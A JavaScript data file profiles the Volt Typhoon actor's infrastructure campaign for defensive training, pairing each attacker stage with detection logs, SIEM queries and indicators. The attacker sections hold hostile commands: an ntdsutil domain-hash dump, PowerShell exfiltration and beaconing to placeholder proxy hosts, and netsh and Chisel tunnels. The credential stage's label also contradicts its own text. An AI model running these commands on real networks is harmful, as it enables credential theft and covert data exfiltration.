const volttyphoon = {
  id: "volttyphoon",
  name: "Volt Typhoon",
  aliases: ["Bronze Silhouette", "Vanguard Panda", "Dev-0391", "UNC3236"],
  origin: "China",
  motivation: "Espionage / Pre-positioning",
  description:
    "Volt Typhoon is a PRC state-sponsored threat actor characterized by living-off-the-land (LOLBin) techniques — using only built-in Windows utilities with zero custom malware. Active since at least 2021, their primary mission is pre-positioning within US critical infrastructure for potential disruption in a future US-China conflict scenario.",
  campaigns: [
    {
      id: "us-critical-infrastructure-2021",
      name: "US Critical Infrastructure Pre-positioning (2021–2023)",
      year: "2021–2023",
      target: "US Power, Water & Communications Infrastructure",
      summary:
        "Volt Typhoon conducted years-long, stealthy intrusions into US critical infrastructure — power utilities, water systems, communications, and transportation — using exclusively living-off-the-land binaries (LOLBins). No custom malware was deployed. All C2 was routed through compromised SOHO routers to appear as US business traffic. The campaign focused on topology mapping and persistent access rather than immediate data theft.",
      sources: [
        { title: "CISA Advisory AA23-144A — Volt Typhoon Targets US Critical Infrastructure with Living-off-the-Land Techniques", publisher: "CISA / NSA / FBI", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a" },
        { title: "Volt Typhoon Targets US Critical Infrastructure with Living-off-the-Land Techniques", publisher: "Microsoft MSTIC", url: "https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/" },
        { title: "CISA Advisory AA24-038A — PRC State-Sponsored Actors Compromise US Critical Infrastructure", publisher: "CISA / NCSC-UK / ASD", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a" },
        { title: "People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection", publisher: "NSA / CISA / FBI", url: "https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Volt_Typhoon.PDF" },
      ],
      diamondModel: {
        adversary: {
          name: "Volt Typhoon (Bronze Silhouette / Vanguard Panda)",
          sponsor: "People's Republic of China — MSS affiliated (Ministry of State Security) or PLA strategic support",
          aliases: ["Bronze Silhouette", "Vanguard Panda", "Dev-0391", "UNC3236"],
          motivation: "Strategic pre-positioning for potential disruption of US critical infrastructure in a contingency scenario (Taiwan conflict); long-term OT/ICS network topology intelligence",
        },
        capability: {
          malware: ["No custom malware — pure LOLBins", "netsh portproxy (tunnel)", "ntdsutil IFM (credential dump)", "certutil (data encoding)", "wmic (remote execution)", "PowerShell (minimal use)"],
          ttps: ["T1078 — Valid Accounts (stolen VPN credentials)", "T1036 — Masquerading (LOLBin renaming)", "T1003.001 — LSASS Memory (ntdsutil IFM)", "T1090 — Proxy (SOHO routers)", "T1571 — Non-Standard Port"],
          sophistication: "Nation-State — unique OPSEC: zero custom malware, all activity via built-in Windows utilities, SOHO router proxy infrastructure to blend C2 with legitimate US IP space",
        },
        infrastructure: {
          domains: ["No actor-controlled domains identified", "All C2 traffic routed through compromised SOHO routers"],
          ips: ["Compromised Cisco RV320/RV325 SOHO routers", "Compromised Netgear ProSafe FVS318G routers", "Compromised Zyxel USG firewall devices"],
          hosting: "Compromised US and allied SOHO routers (Cisco RV320, Netgear ProSafe, Zyxel USG) as proxy layer — all C2 traffic appears to originate from legitimate US business IP addresses, defeating geographic threat intelligence",
        },
        victim: {
          sectors: "US electric power utilities (transmission and distribution), water and wastewater treatment systems, natural gas pipeline operators, telecommunications carriers, US Pacific territory infrastructure (Guam — strategic military hub)",
          geography: "Continental United States and Guam (US Pacific military staging area — primary strategic focus); Canada, UK, Australia, New Zealand (Five Eyes partners also targeted)",
          targeting: "Long-duration access (months to years) with no active exploitation; goal is topology mapping and persistent access for future disruption, not immediate data theft or ransomware",
        },
      },
      stages: [
        {
          id: "initial-access",
          name: "Valid Account Compromise",
          ttp: "T1078",
          ttpName: "Valid Accounts",
          phase: "Initial Access",
          attacker: {
            summary:
              "Volt Typhoon obtained legitimate VPN and remote management credentials for critical infrastructure networks — likely through spearphishing, password spraying against externally exposed VPN concentrators, or purchase from access brokers. Using valid credentials, they logged into VPN gateways and remote management interfaces. All initial access activity was indistinguishable from legitimate administrator logins, providing the stealth foundation for long-term dwell time measured in months.",
            tools: ["netsh (network enumeration)", "wmic (system info)", "ipconfig", "net user /domain", "Stolen VPN credentials"],
            commands: [
              "// Authentication with stolen VPN credentials — appears as legitimate admin logon",
              "// All following commands use built-in Windows utilities only — no custom tools",
              "// Initial host and network enumeration",
              "wmic /node:localhost computersystem get Name,Domain,Manufacturer,Model",
              "netsh interface show interface",
              "ipconfig /all",
              "net user /domain",
              "net group \"Domain Admins\" /domain",
            ],
          },
          defender: {
            logs: [
              "VPN authentication from unusual IP geolocation or ASN (VPN gateway log)",
              "Successful logon at unusual hours for account (authentication log — Event ID 4624)",
              "Single account authenticating from multiple source IPs within short time window (UEBA alert)",
              "VPN session source IP resolves to SOHO router or residential ASN block (GeoIP enrichment)",
            ],
            detection:
              "Implement MFA for all remote access — this is the single most effective control against credential-based initial access. Alert on VPN logins from new locations, unusual hours, or ASNs associated with SOHO devices. Behavioral analytics: flag accounts authenticating from new geographies or multiple simultaneous sessions. OT network access should require separate MFA-protected credentials from corporate VPN, isolated by segmentation.",
            siemQuery:
              'index=vpn action=authenticated | iplocation src_ip | stats dc(src_ip) as unique_ips values(Country) as countries by user | where unique_ips > 2 OR (isnotnull(countries) AND mvcount(countries) > 1)',
            ifMissed:
              "Volt Typhoon establishes a persistent foothold in the critical infrastructure network using legitimate credentials. Detection becomes extremely difficult — all subsequent activity uses built-in Windows tools that generate the same events as legitimate administrators. Long-term dwell (months to years) enables comprehensive OT network topology mapping to identify high-value disruption targets for future contingency use.",
          },
          iocs: [
            { type: "Event", indicator: "VPN auth success followed by wmic/netsh enumeration within 5 minutes", description: "Volt Typhoon initial access pattern — credential use immediately followed by LOLBin network and host enumeration commands" },
            { type: "IP", indicator: "SOHO router IP blocks (Cisco/Netgear/Zyxel residential ranges)", description: "Volt Typhoon proxy indicator — VPN source IP from compromised consumer router ASN, not a datacenter or corporate range" },
            { type: "Command", indicator: "net group \"Domain Admins\" /domain after VPN auth", description: "Volt Typhoon domain enumeration — privilege mapping executed immediately after initial valid account authentication" },
          ],
        },
        {
          id: "defense-evasion",
          name: "LOLBin Masquerading",
          ttp: "T1036",
          ttpName: "Masquerading",
          phase: "Defense Evasion",
          attacker: {
            summary:
              "Volt Typhoon renamed Windows LOLBins and system utilities to appear as legitimate system processes, evading detection by tools that alert on binary names or paths. Commands were executed through Windows management interfaces (WMIC, PowerShell, cmd.exe) to blend with normal administrator behavior. The actor deliberately avoided importing any third-party tools, custom scripts, or known malware families — all actions were performed with operating system utilities present on every Windows installation.",
            tools: ["ntdsutil.exe (renamed)", "netsh.exe", "certutil.exe", "wmic.exe", "powershell.exe", "cmd.exe"],
            commands: [
              "// LOLBin masquerading — copy system tools to user-writable paths",
              "copy C:\\Windows\\System32\\ntdsutil.exe C:\\Windows\\Temp\\svchost32.exe",
              "copy C:\\Windows\\System32\\netsh.exe C:\\ProgramData\\Microsoft\\svchost32.exe",
              "// Data encoding via certutil to bypass string-based detection",
              "certutil -encode C:\\Windows\\Temp\\output.bin C:\\Windows\\Temp\\output.b64",
              "certutil -decode C:\\Windows\\Temp\\input.b64 C:\\Windows\\Temp\\input.bin",
              "// All remaining ops: native Windows utilities only — no custom tooling",
            ],
          },
          defender: {
            logs: [
              "Windows system binary executed from non-standard path (Sysmon Event ID 1 — process creation with non-System32 image path)",
              "certutil.exe with -encode or -decode arguments (Sysmon Event ID 1 — CommandLine field)",
              "Process image hash matches known Windows binary but path is outside System32/SysWOW64 (EDR)",
              "ntdsutil or netsh executed from C:\\Windows\\Temp or user profile directory (Event ID 4688)",
            ],
            detection:
              "Monitor for Windows system binaries executing from non-standard paths (C:\\Windows\\Temp, %AppData%, user profile directories). EDR hash-to-path validation: if a process hash matches ntdsutil.exe but the path is not System32, alert immediately. certutil with -encode/-decode is almost never used legitimately outside PKI management; alert on any use. Process ancestry analysis: LOLBins spawned from VPN client or web browser processes are high-priority alerts.",
            siemQuery:
              'index=endpoint EventCode=1 (Image="*\\Temp\\*" OR Image="*\\AppData\\*" OR Image="*\\ProgramData\\*") | lookup windows_system_binaries Image OUTPUT known_binary | where isnotnull(known_binary) | stats count by host, Image, CommandLine, ParentImage',
            ifMissed:
              "Volt Typhoon achieves near-complete defense evasion by blending with legitimate administrator activity. Security tools relying on binary name or hash detection fail entirely. The actor freely enumerates Active Directory, maps OT network topology, and exfiltrates configuration data from ICS management systems — all without deploying any software that triggers signature-based detection.",
          },
          iocs: [
            { type: "Path", indicator: "C:\\Windows\\Temp\\svchost32.exe (copy of ntdsutil.exe)", description: "Volt Typhoon LOLBin masquerade — ntdsutil copied to Temp directory under svchost-mimicking filename" },
            { type: "Command", indicator: "certutil -encode / certutil -decode (data staging)", description: "Volt Typhoon exfiltration prep — certutil used for base64 encoding of staged data, anomalous use of legitimate certificate management tool" },
            { type: "Target Pattern", indicator: "System32 binary hash executing from non-System32 path", description: "Volt Typhoon evasion IOA — any Windows system binary executing outside its expected path indicates LOLBin masquerading" },
          ],
        },
        {
          id: "credential-access",
          name: "NTDS.dit Credential Dump via ntdsutil",
          ttp: "T1003.001",
          ttpName: "OS Credential Dumping: LSASS Memory",
          phase: "Credential Access",
          attacker: {
            summary:
              "Volt Typhoon used ntdsutil.exe — a legitimate Active Directory database management tool — in IFM (Install From Media) mode to create an offline snapshot of the NTDS.dit database, extracting all domain password hashes without directly touching LSASS (which most EDRs monitor). This approach uses an officially-supported AD backup mechanism that generates legitimate-looking audit events. The NTDS.dit snapshot was compressed, base64-encoded with certutil, and exfiltrated through the SOHO proxy layer.",
            tools: ["ntdsutil.exe (IFM mode)", "certutil.exe (exfiltration encoding)", "PowerShell Compress-Archive"],
            commands: [
              "// ntdsutil IFM snapshot — officially-supported AD backup mechanism",
              "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ifm\" q q",
              "// Compress snapshot for exfiltration",
              "powershell -c Compress-Archive C:\\Windows\\Temp\\ifm\\* C:\\Windows\\Temp\\db.zip",
              "// Encode for transmission",
              "certutil -encode C:\\Windows\\Temp\\db.zip C:\\Windows\\Temp\\db.b64",
              "// Exfiltrate via HTTPS to SOHO proxy (appears as legitimate HTTPS traffic)",
              "powershell (New-Object Net.WebClient).UploadString('https://<soho_proxy>:8443/up','<b64_data>')",
            ],
          },
          defender: {
            logs: [
              "ntdsutil.exe executed with 'ifm' or 'create full' arguments (Event ID 4688 or Sysmon 1)",
              "NTDS.dit file read by non-NTDS service process (Event ID 4663 — Object Access)",
              "Volume Shadow Copy snapshot created by non-backup application (VSS event + Sysmon 11)",
              "Large file creation in C:\\Windows\\Temp followed by outbound HTTPS transfer (EDR + proxy log)",
            ],
            detection:
              "Alert on ntdsutil.exe executed with IFM/create arguments — this is almost never needed outside Active Directory migration scenarios (and those should be change-managed). Any process reading NTDS.dit that is not the AD Directory Service should page SOC immediately. Privileged AD operations should require PAM (Privileged Access Management) checkout with session recording. Monitor for PowerShell Compress-Archive targeting Windows admin directories.",
            siemQuery:
              'index=endpoint (EventCode=4688 OR source=sysmon EventCode=1) (CommandLine="*ntdsutil*" OR Image="*ntdsutil*") (CommandLine="*ifm*" OR CommandLine="*create*") | stats count by host, SubjectUserName, CommandLine',
            ifMissed:
              "Volt Typhoon has an offline copy of all Active Directory password hashes. Offline cracking yields domain administrator credentials in hours. The actor can authenticate as any domain user without generating interactive logon events, maintaining persistent invisible access for years. NT hashes enable pass-the-hash attacks across the entire domain without needing to crack passwords.",
          },
          iocs: [
            { type: "Command", indicator: "ntdsutil \"ac i ntds\" \"ifm\" \"create full\" <path>", description: "Volt Typhoon NTDS.dit credential dump — legitimate AD IFM backup command used offensively to extract all domain password hashes" },
            { type: "File", indicator: "C:\\Windows\\Temp\\ifm\\Active Directory\\ntds.dit", description: "NTDS.dit offline snapshot from ntdsutil IFM — contains all domain account password hashes in exfiltrable archive" },
            { type: "Event", indicator: "VSS snapshot creation + NTDS.dit file access by non-NTDS process", description: "Volt Typhoon credential dump IOA — Volume Shadow Copy accessed to read locked NTDS.dit without direct LSASS interaction" },
          ],
        },
        {
          id: "c2-proxy",
          name: "SOHO Router Proxy Infrastructure",
          ttp: "T1090",
          ttpName: "Proxy",
          phase: "Command & Control",
          attacker: {
            summary:
              "Volt Typhoon's C2 infrastructure consisted entirely of compromised SOHO routers (Cisco RV320/RV325, Netgear FVS318G, Zyxel USG) belonging to US businesses and individuals. By routing all C2 traffic through these legitimate US IP addresses, Volt Typhoon defeated geographic threat intelligence blocking and IP reputation services. The routers were compromised via known CVEs in end-of-life firmware that never received patches. The SOHO proxy layer was exposed by a US DOJ court order in January 2024 that disrupted the botnet.",
            tools: ["Compromised Cisco RV320/RV325 routers", "Compromised Netgear ProSafe routers", "netsh portproxy", "FRP (Fast Reverse Proxy) open-source tunnel"],
            commands: [
              "// netsh portproxy — tunnel C2 through compromised SOHO router",
              "netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=443 connectaddress=<actor_backend>",
              "// FRP (Fast Reverse Proxy) client on SOHO router",
              "// frpc.ini: [common] server_addr = <actor_c2>; [ssh] type = tcp; local_port = 22",
              "// Result: all Volt Typhoon C2 traffic appears as traffic from a legitimate US Cisco router",
              "netsh interface portproxy show all",
            ],
          },
          defender: {
            logs: [
              "Outbound connection to SOHO router/residential IP from OT management workstation (netflow + GeoIP)",
              "netsh portproxy commands executed on management workstations (Event ID 4688)",
              "Persistent low-bandwidth HTTPS connection to same external IP on non-standard port (netflow anomaly)",
              "Egress firewall log: OT segment host initiating outbound connection not matching approved destinations",
            ],
            detection:
              "Maintain a strict allowlist of approved external destinations for critical infrastructure management systems — any host in OT segments connecting to residential/SOHO IPs should alert immediately. Monitor for netsh portproxy commands (legitimate use is extremely rare). Strict egress filtering on OT networks: all outbound connections require explicit approval. Threat intelligence feeds for known-compromised SOHO router IPs are valuable but lag the actor's rotation.",
            siemQuery:
              'index=network src_zone="OT" dest_zone="internet" NOT dest_ip IN (approved_ips) | iplocation dest_ip | where Type IN ("Residential","SOHO","ISP-Residential") | stats count by src_ip, dest_ip, dest_port, City, Country',
            ifMissed:
              "Volt Typhoon maintains undetectable persistent C2 access to OT network management systems for months to years. Geographic threat intelligence and IP reputation blocking are defeated by the US-IP proxy layer. The actor continues mapping industrial control system architecture, identifying substation control systems, SCADA servers, and water treatment SCADA platforms for future contingency disruption operations.",
          },
          iocs: [
            { type: "Command", indicator: "netsh interface portproxy add v4tov4 (from OT management host)", description: "Volt Typhoon SOHO proxy setup — netsh portproxy tunnel routes C2 traffic through compromised US routers" },
            { type: "Tool", indicator: "FRP (Fast Reverse Proxy) on compromised SOHO router firmware", description: "Volt Typhoon C2 relay — open-source FRP tool deployed on compromised routers, connects to actor backend infrastructure" },
            { type: "IP", indicator: "Cisco RV320/RV325 management interface (compromised end-of-life firmware)", description: "Volt Typhoon proxy node — EOL Cisco small business router with known CVEs exploited for proxy relay infrastructure" },
          ],
        },
        {
          id: "c2-ports",
          name: "Non-Standard Port C2 Channels",
          ttp: "T1571",
          ttpName: "Non-Standard Port",
          phase: "Command & Control",
          attacker: {
            summary:
              "Volt Typhoon conducted C2 communications over non-standard ports (8443, 8080, 7443) to evade firewall rules that only inspect standard HTTPS (443) or HTTP (80). These ports are common enough in enterprise environments (application servers, dev instances, proxy configs) to avoid immediate alerting while bypassing default security tooling. All communications were TLS-encrypted with certificates mimicking legitimate software vendors, further obfuscating the traffic.",
            tools: ["Custom TLS channels (ports 8443, 8080, 7443)", "netsh portproxy", "PowerShell WebClient"],
            commands: [
              "// C2 over port 8443 — non-standard but common enough to avoid alerts",
              "powershell (New-Object Net.WebClient).DownloadString('https://<soho_proxy>:8443/s')",
              "// Chisel SOCKS5 tunnel for proxied access to internal network",
              "// chisel client <soho_router>:8080 R:1080:socks",
              "// netsh portproxy forwarding on non-standard port",
              "netsh interface portproxy add v4tov4 listenport=7443 listenaddress=127.0.0.1 connectport=443 connectaddress=<actor_c2>",
              "// Periodic beacon: GET /s every 4-8 hours (low-frequency to avoid detection)",
            ],
          },
          defender: {
            logs: [
              "Outbound TLS connections to external IPs on ports 8443/8080/7443 from OT workstation (firewall log)",
              "PowerShell outbound network connection on high port to external IP (Sysmon Event ID 3)",
              "TLS certificate with mismatched CN for destination IP (SSL inspection log)",
              "Low-frequency periodic connections to same external IP on consistent interval (netflow anomaly detection)",
            ],
            detection:
              "Implement strict egress filtering — OT management systems should only communicate on ports explicitly required for their function. No general HTTPS egress. SSL inspection on OT egress points can identify self-signed or anomalous certificates on non-standard ports. Beaconing detection: model expected connection patterns for each host; flag connections with consistent intervals (indicating automated C2 check-in). Most legitimate traffic does not beacon on exact schedules.",
            siemQuery:
              'index=network dest_port IN (8443,8080,7443,9443,4443) src_zone IN ("OT","ICS","SCADA","Control") | stats count as connections by src_ip, dest_ip, dest_port | where connections > 10 | eval interval_variance=...',
            ifMissed:
              "Volt Typhoon maintains undetected interactive C2 access over non-standard encrypted channels. Security monitoring focused on standard ports misses the actor entirely. The actor continues long-dwell access — mapping OT/ICS topology, documenting substation configurations, and positioning for potential disruption of power, water, or communications infrastructure in a future contingency scenario.",
          },
          iocs: [
            { type: "Event", indicator: "Periodic HTTPS beacon on port 8443 from OT management host (4–8 hour interval)", description: "Volt Typhoon C2 beacon pattern — low-frequency regular-interval connections to SOHO proxy on non-standard HTTPS port" },
            { type: "URL Pattern", indicator: "GET https://<SOHO-router-IP>:8443/s (single-character path)", description: "Volt Typhoon C2 check-in URI — minimal GET request to SOHO proxy indicating automated C2 beacon via non-standard port" },
            { type: "Tool", indicator: "Chisel (open-source SOCKS5 tunnel) on non-standard port", description: "Volt Typhoon tunneling tool — open-source Chisel creates SOCKS5 proxy through SOHO router for interactive C2 access" },
          ],
        },
      ],
    },
  ],
}

export default volttyphoon
